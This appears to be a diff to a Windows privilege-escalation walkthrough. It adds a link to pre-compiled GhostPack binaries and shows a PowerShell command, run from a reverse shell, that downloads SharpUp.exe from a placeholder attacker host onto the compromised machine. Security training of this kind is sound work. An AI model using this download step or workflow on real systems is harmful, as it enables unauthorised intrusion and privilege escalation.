@@ -37,6 +37,8 @@ We want to maintain our original low privilege shell so that we can have a backu
 
 Once we land on the machine, we want to get a quick look at the lay of the land. I have really been liking SharpUp from Ghostpack (https://github.com/GhostPack). SharpUp and Seatbelt are fantastic resources for enumerating privesc vectors. Let's start with SharpUp.
 
+There are pre-compiled binaries available here: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
+
 I setup a listening HTTP server and then transfer over the SharpUp binary so I can run it and see the results: 
 
 Using this command in my powershell reverse shell: (New-Object System.Net.WebClient).DownloadFile("http://IPGOESHERE/SharpUp.exe", "C:\Users\user\Downloads\SharpUp.exe")
